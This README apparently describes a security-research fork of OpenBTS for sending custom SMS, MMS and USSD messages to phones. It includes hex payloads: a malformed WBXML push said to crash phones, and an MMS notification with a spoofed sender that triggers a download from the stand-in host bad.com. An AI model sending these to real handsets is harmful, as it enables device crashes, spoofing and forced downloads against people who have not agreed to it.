# OpenBTS

OpenBTS fork with a few extras for SMS/MMS/USSD testing. Ensure you have a GSM licence first.
https://www.contextis.com/resources/blog/binary-sms-old-backdoor-your-new-thing/

 - MT SMS/MMS with custom TPDUs
 - MT USSD with custom facilities

This took months to get right. GSM is *ridiculously* complicated but stubborn persistence, wireshark and ignorance pays off eventually...
The scripts we use to send SMS, MMS & USSD PDUs are not included.

## Setup
http://openbts.org/w/index.php?title=BuildInstallRun
```
git clone https://github.com/RangeNetworks/dev.git
cd dev
./clone.sh
./switchto.sh master
./build.sh B200
rm -rf openbts
git clone https://github.com/ctxis/openbts.git
cd openbts
make
```
## Logging
Run wireshark on loopback with filter 'gsm_sms'
```
OpenBTS> rawconfig.GSMTAP.TargetIP 127.0.0.1
OpenBTS> rawconfig Control.GSMTAP.GSM 1
```
Also enable SMS logging then tail logs:
```
OpenBTS> rawconfig Log.Level.L3SMSControl.cpp DEBUG
tail -f /var/log/OpenBTS.log | grep -i SMS
```

## Mobile Terminated SMS

### Hello from 12345
```
OpenBTS> rawconfig SMS.MIMEType text/plain
OpenBTS> sendsms 23415914952xxxx 12345 Hello
```
### Multipart 8-bit WSP Push with UDH header and (malformed) WBXML
Header is a Lebara WBXML config message but body is garbage. This could crash your phone.
```
OpenBTS> rawconfig SMS.UDHI 1
OpenBTS> rawconfig SMS.DCS 4
OpenBTS> rawconfig SMS.MIMEType application/vnd.3gpp.sms
SMS.MIMEType changed from "text/plain" to "application/vnd.3gpp.sms"
OpenBTS> sendsms 2341591721xxxx 12345 0B05040B8423F00003AA02017468697320697320612074657374206f6620636f6e636174656e617465642062696e61727920534d532077697468206120554448206865616465722e20496620796f752063616e207265616420746869
OpenBTS> sendsms 23415917212xxxx 12345 0B05040B8423F00003AA02027320796f752070726f6261626c792077616e7420746f206368616e67652074686520706f7274206e756d62657273206e6f7720616e6420646f20736f6d657468696e67206e61737479
```

### Notify MMS, 8-bit, .vcf contact card with UDH header and spoofed originator
This will trigger a download from http://bad.com/x.php if you have mobile data on. WiFi doesn't count.
You can DL MMS Multimedia from *anywhere* on the internet which is dangerous/great!
A .mms file download needs to be specially formatted but this is beyond the scope of OpenBTS.
```
OpenBTS> sendsms 23415917212xxxx 12345 0B05040B8423F000039001010f0603beaf848c8298393039303930008d908919802b31323334352f545950453d504c4d4e008a808e0201d888058103ffffff83687474703a2f2f6261642e636f6d2f782e7068703f393039303930009580
```
## Mobile Terminated USSD
Normally USSD codes like *#100# are used from the MS (Mobile originated / MO) but they can come from the network (MT). They're used by disaster warning systems and third world banking apps. A notify facility (0x3d) creates a pop-up msg, a request facility (0x3c) creates a pop-up form which returns the response as a notify. Custom facilities implemented by networks get parsed in the background without prompting the user making this a powerful and little known remote control protocol.

USSD Wireshark filter:
```
gsmtap.chan_type == 7 && !icmp
```

### "Godzilla! run for your lives!" notify facility
```
sendss 23415917212xxxx "Godzilla! run for your lives!" 0
```
### "Godzilla! run for your lives!" as a raw facility including headers
```
OpenBTS> sendss 23415917212xxxx a12a02013702013d30220401ff041d476f647a696c6c612c2072756e20666f7220796f7572206c6976657321 1
```



